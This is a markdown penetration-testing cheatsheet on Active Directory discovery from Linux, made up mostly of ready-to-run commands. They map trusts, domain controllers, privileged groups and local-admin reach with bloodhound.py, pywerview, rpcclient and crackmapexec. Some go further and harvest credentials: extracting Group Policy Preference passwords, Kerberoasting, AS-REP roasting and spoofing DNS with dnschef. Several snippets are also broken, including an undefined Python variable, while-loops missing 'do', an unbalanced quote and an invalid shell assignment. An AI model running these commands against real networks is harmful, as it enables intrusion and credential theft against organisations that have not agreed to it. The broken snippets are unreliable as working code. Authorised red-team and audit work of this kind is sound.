---
layout: post
title: TA0007 Discovery - AD Collection & Enumeration with Linux
category: pen
parent: cheatsheets
modified_date: 2023-06-26
permalink: /pen/discov-ad
---

**Mitre Att&ck Entreprise**: [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)

**Menu**
<!-- vscode-markdown-toc -->
* [prereq](#prereq)
	* [load-env](#load-env)
	* [tools](#tools)
* [collect](#collect)
	* [adexplorersnapshot](#adexplorersnapshot)
	* [bloodhound.py](#bloodhound.py)
	* [dnschef](#dnschef)
* [shoot](#shoot)
	* [shoot-forest](#shoot-forest)
	* [shoot-dom](#shoot-dom)
		* [shoot-pwd-policy](#shoot-pwd-policy)
		* [shoot-delegations](#shoot-delegations)
		* [shoot-priv-users](#shoot-priv-users)
		* [shoot-priv-machines](#shoot-priv-machines)
		* [shoot-gpo](#shoot-gpo)
		* [shoot-shares](#shoot-shares)
		* [shoot-mssql-servers](#shoot-mssql-servers)
		* [shoot-spns](#shoot-spns)
		* [shoot-npusers](#shoot-npusers)
		* [shoot-dacl](#shoot-dacl)
		* [shoot-gpos](#shoot-gpos)
* [iter](#iter)
	* [iter-memberof](#iter-memberof)
	* [iter-scope](#iter-scope)
* [refresh](#refresh)
	* [check-computer-access](#check-computer-access)
	* [last-logons](#last-logons)
	* [last-logons-computer](#last-logons-computer)
	* [last-logons-ou](#last-logons-ou)
	* [whereis-user](#whereis-user)
	* [whereis-group](#whereis-group)
* [sources](#sources)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='prereq'></a>prereq

### <a name='load-env'></a>load-env
* URL suffix (F6 shortcut) : [/pen/setenv#lin](/pen/setenv#lin)

### <a name='tools'></a>tools

<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>$(window).load(function() {var repos = ["https://api.github.com/repos/c3c/ADExplorerSnapshot.py", "https://api.github.com/repos/fox-it/BloodHound.py", "https://api.github.com/repos/Porchetta-Industries/CrackMapExeccrackmapexec", "https://api.github.com/repos/iphelix/dnschef", "https://api.github.com/repos/CiscoCXSecurity/enum4linux", "https://api.github.com/repos/the-useless-one/pywerview"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<link href="/sortable.css" rel="stylesheet" />
<script src="/sortable.js"></script>
<div id="repos">
    <table id="repo_list" class="sortable">
      <tr><th>repo</th><th>last update</th><th>stars</th><th>watch</th><th>language</th></tr>
    </table>
</div>

## <a name='collect'></a>collect

### <a name='adexplorersnapshot'></a>adexplorersnapshot
* usage: convert ADExplorer snapshot to BloodHound json files:
```
mkdir $zdom_dc_fqdn
ADExplorerSnapshot.py -o $zdom_dc_fqdn -m BloodHound $zdom_dc_fqdn".dat"
```

### <a name='bloodhound.py'></a>bloodhound.py
```sh
bloodhound.py -c DConly -dc $zdom_dc_fqdn -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn
bloodhound.py -c DConly -dc $zdom_dc_fqdn -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn -ns 127.0.0.1
```

[Collection methods](https://github.com/fox-it/BloodHound.py#installation-and-usage) are not the same as sharphound's ones.

### <a name='dnschef'></a>dnschef
* set up a nameserver in localhost :
```sh
sudo dnschef --fakeip $zdom_dc_ip --fakedomains $zdom_fqdn -q                                                                                                                                                                        
```
* add the ns option to bloodhood.py:
```sh
-ns 127.0.0.1
``` 


## <a name='shoot'></a>shoot

SHOOT General Properties :

### <a name='shoot-forest'></a>shoot-forest

Forest properties:
```sh
# Enum domains and trusts: V1
pywerview.py get-netdomaintrust -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip > $zcase"_get-netdomaintrust.txt"
grep "trustpartner" $zcase"_get-netdomaintrust.txt" | cut -d" " -f5

# Enum domains and trusts: V2
rpcclient -U $ztarg_user_name --password $ztarg_user_pass -I $ztarg_dc_ip  
rpcclient> enumdomains
rpcclient> enumtrusts

# Enum domains and trusts: V3
./bloodhound.py -dc $ztarg_dc_fqdn -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -c Trusts
python
>>> import json
with open ("X.json","r+") as f:                                                                                     
	c = content['data'][0]['Trusts']
	for t in c:
		print(t['TargetDomainName'] + "," + str(t['IsTransitive']) + "," + t['TrustDirection'] + "," + t['TrustType'])

# Get the IP subnetting / IP plan
cut -f1 -d" " trusts.txt > $zcase"_trusts_clean.txt"
for i in `cat $zcase"_trusts_clean.txt"`; do ping -a $i; done
```

### <a name='shoot-dom'></a>shoot-dom

Domain properties:

```sh
# Identify the DC / DHCP services 
nmap $zdom_fqdn --script broadcast-dhcp-discover
sudo tcpdump -ni eth0 udp port 67 and port 68

# dig : listing the DCs
dig -t SRV _ldap._tcp.dc._msdcs.$zdom_fqdn | grep "^[a-zA-Z]" | cut -f1 -d"." | sort -u
# listing the PDCs
dig -t SRV _ldap._tcp.pdc.msdcs.$zdom_fqdn | grep "^[a-zA-Z]" | cut -f1 -d"." | sort -u
# dig: listing the GCs
dig -t SRV _ldap._tcp.gc._msdcs.$zdom_fqdn | grep "^[a-zA-Z]" | cut -f1 -d"." | sort -u
# dig : listing the KDCs
dig -t SRV _kerberos._tcp.dc.msdcs.$zdom_fqdn | grep "^[a-zA-Z]" | cut -f1 -d"."
# dig : listing the kerberos change password services
dig -t SRV _kpasswd._tcp.$zdom_fqdn | grep "^[a-zA-Z]" | cut -f1 -d"." | sort -u
# dig : find domain from its GUID
GUID="12345678-1234-1234-1234-123456789ab"
dig -t SRV $GUID"._msdcs."$zdom_fqdn

nmap $zdom_fqdn --script dns-srv-enum --script-args "dns-srv-enum.domain='$zdom_fqdn'"

nbtscan -r 10.0.0.0/24
```

#### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
```sh
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol

# Get the domain pasword policy
rpcclient -U $ztarg_user_name --password $ztarg_user_pass -I $ztarg_dc_ip  
rpcclient> getdompwinfo
```

#### <a name='shoot-delegations'></a>shoot-delegations

Kerberos Delegations:

Easy enumeration with **Impacket\FindDelegation.py**:

```bash
# with password in the CLI
zz=$zdom_fqdn'/'$ztarg_user_name':'$ztarg_user_pass 

findDelegation.py  $zz -dc-ip $zdom_dc_ip

# with kerberos auth / password not in the CLI
zz=$zdom_fqdn'/'$ztarg_user_name'
findDelegation.py  $zz -k -no-pass
```

References :
- [thehacker.recipes/ad/movement/kerberos/delegations - KUD / KCD / RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
- [https://attack.mitre.org/techniques/T1134/001/](https://attack.mitre.org/techniques/T1134/001/)

#### <a name='shoot-priv-users'></a>shoot-priv-users

*[Scanning for Active Directory Privileges & Privileged Accounts](https://adsecurity.org/?p=3658) by Seam MetCalf, the 14/06/2017.

```sh
# privileged group
ztarg_group_name="Backup Operators"; ztarg_group_nick="bo"
ztarg_group_name="DNSAdmins"; ztarg_group_nick="dns"
ztarg_group_name="Enterprise Admins"; ztarg_group_nick="ea"
ztarg_group_name="Group Policy Creator Owners"; ztarg_group_nick="gpco"
ztarg_group_name="Remote Desktop Users"; ztarg_group_nick="rdp"
ztarg_group_name="Domain Admins"; ztarg_group_nick="da"
echo $ztarg_group_name; pywerview.py get-netgroupmember -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip -r > "$zcase""_get-netgroupmember_""$ztarg_group_nick"".txt"

# list the samaccountname
echo $ztarg_group_name
cat "$zcase""_get-netgroupmember_""$ztarg_group_nick"".txt" | grep membername |awk '{print $2}'

# V1: display samaccountname with admincount = 1
pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --admin-count > "$zcase""_get-netuser_admincount.txt"
cat "$zcase""_get-netuser_admincount.txt" | grep samaccountname |awk '{print $2}' |sort
cat "$zcase""_get-netuser_admincount.txt" | grep "samaccountname\|description" | cut -f2 -d":"

# V2: display samaccountname with admincount = 1
bloodhound.py -c Group --domain $zdom_fqdn -dc $zdom_dc_fqdn -u $ztarg_user_name -p $ztarg_user_pass
cat users.json | jq -r '.data[].Properties | select((.admincount==true) and .enabled==true) | .samaccountname'
```

#### <a name='shoot-priv-machines'></a>shoot-priv-machines
```sh
# DC v1
dig -t SRV _gc._tcp.$zdom_fqdn | grep "^[a-z]"

# DC v2
ztarg_ou="OU=Domain Controllers,"$zdom_dn; ztarg_ou_nick="dc"
echo $ztarg_ou; pywerview.py get-adobject -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip -a "$ztarg_ou" > "$zcase""_get-adobject_""$ztarg_ou_nick"".txt"

# DC v2 : list the samaccountname
echo $ztarg_ou
cat "$zcase""_get-adobject_""$ztarg_ou_nick"".txt" | grep samaccountname |awk '{print $2}'

DS-Replication-Get-Changes
DS-Replication-Get-Changes-In-Filtered-Set

```

#### <a name='shoot-gpo'></a>shoot-gpo
```bash
# cme
crackmapexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_pasword
crackmapexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_autologin
# impacket
Get-GPPPassword.py $zz@$zdom_dc_ip
```

#### <a name='shoot-shares'></a>shoot-shares
#### <a name='shoot-mssql-servers'></a>shoot-mssql-servers

#### <a name='shoot-spns'></a>shoot-spns
```
# https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
GetUserSPNs.py $zdom_fqdn/$ztarg_user_name -k -no-pass -dc-ip $zdom_dc_ip -request >> tgs.txt
GetUserSPNs.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> tgs.txt
```

#### <a name='shoot-npusers'></a>shoot-npusers
```
# https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
GetNPUsers.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> np_users.txt 
```

#### <a name='shoot-dacl'></a>shoot-dacl
```sh
# STEP 1: global gathering
```

#### <a name='shoot-gpos'></a>shoot-gpos
```
```

## <a name='iter'></a>iter

### <a name='iter-memberof'></a>iter-memberof
User groups:
```bash
# Get user info
ztarg_user_next=""
ztarg_computer=""
date_now=$(date "+%F-%H%M")
pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username $ztarg_user_next > $zcase"_getnetuser_"$ztarg_user_next".txt"
pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username $ztarg_user_next > $zcase"_getnetuser_"$ztarg_user_next"_"$ztarg_computer"_"$date_now".txt"

# Get user info + canarytoken check
# select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount
egrep -i  "^(cn|whenCreated|accountExpires|pwdLastSet|lastLogon|logonCount|badPasswordTime|badPwdCount)" $zcase"_"$ztarg_computer"_"$ztarg_user_next".txt"

# Get user memberof info
pywerview.py get-netgroup -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username XXX | grep -v "^$" | cut -f2 -d" "  > $zcase"_getnetgroup_xxx.txt"

# Get the machine's full-data
pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --computername XXX --full-data > $zcase"_getnetcomputer_xxx.txt"

# Get the machines based on an adspath / OU
ztarg_ou = "OU=Workstations,"$zdom_fqdn
ztarg_adspath = "ldap://" + $ztarg_ou
pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -a $ztarg_adspath --dc-ip $zdom_dc_ip | grep -v "^$" | cut -f2 -d" " > $zcase"_getnetcomputer_ou_x.txt"
```

### <a name='iter-scope'></a>iter-scope
```bash
# Find where the account is local admin V1
./bloodhound.py -dc $zdom_dc_ip -d $zdom_fqdn -u $ztarg_user_name -p XXX -c LocalAdmin --computerfile pt_xxx_getnetcomputer_ou_x.txt
cat 2023xxxxxxx_computers.json | jq '.data[] | select(.LocalAdmins.Collected==true)'| jq '.Properties.name' > $zcase"_fla_pwn.txt"

# Find where the account is local admin V2
cme winrm pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
cme smb pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass

# Get the DNs of the owned machines 
# Get the DNs of the owned machines / get the cn computer (1 line) and its DN (1 line)
while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn distinguishedName >> $zcase"_fla_pwn_dn.txt"; done < $zcase"_fla_pwn.txt"
# Get the DNs of the owned machines / format the result returned to CSV
i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_fla_pwn_dn.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_fla_pwn_dn.csv; i=0; fi; done < $zcase"_fla_pwn_dn.txt"

# Get the OS of the owned machines /
# Get the OS of the owned machines / get the cn computer (1 line) and its OS (1 line)
while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn operatingSystem >> $zcase"_getcomputer_XXX_os.txt"; done < $zcase"_pwned_machines.txt"

# Get the OS of the owned machines / format the result returned to CSV
i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> $zcase"_getnetcomputer_XXX_os.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> $zcase"_getnetcomputer_XXX_os.csv; i=0; fi; done < $zcase"_getcomputer_XXX_os.txt"
```

## <a name='refresh'></a>refresh

### <a name='check-computer-access'></a>check-computer-access
### <a name='last-logons'></a>last-logons
```sh
pywerview get-netgroupmember --groupname "Domain Admins" -u $ztarg_user_name -p $ztarg_user_pass -w $zdom_fqdn --dc-ip $zdom_dc_ip -r --full-data | grep -i "samaccountname\|pwdlastset"
pywerview get-netgroupmember --groupname "Domain Admins" -u $ztarg_user_name -p $ztarg_user_pass -w $zdom_fqdn --dc-ip $zdom_dc_ip -r --full-data | grep -i "samaccountname\|pwdlastset\|lastlogontimestamp"
```
### <a name='last-logons-computer'></a>last-logons-computer
### <a name='last-logons-ou'></a>last-logons-ou

Who is logged on a computer:
```bash

```
### <a name='whereis-user'></a>whereis-user
### <a name='whereis-group'></a>whereis-group

## <a name='sources'></a>sources

* [multiple neo4j databases](https://neo4j.com/developer/manage-multiple-databases/) 💥 ENTERPRISE-ONLY ✅ WORKAROUND: [DOCKER CONTAINER](/sys/docker/neo4j)
* [enum4linux queries](https://labs.portcullis.co.uk/tools/enum4linux/)
* [Fun with LDAP & Kerberos - ThotCon 2017](https://github.com/jomivz/cybrary/blob/master/purpleteam/red/windows/LDAP%20Service%20and%20Kereberos%20Protocol%20Attacks.pdf) 
* [AD Enumeration on Linux OS - YT](https://www.youtube.com/watch?v=2Xfd962QfPs)
* [RPCclient cookbook](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html)
* [Other LDAP queries examples](https://theitbros.com/ldap-query-examples-active-directory/)
* [Other LDAP queries examples](https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb)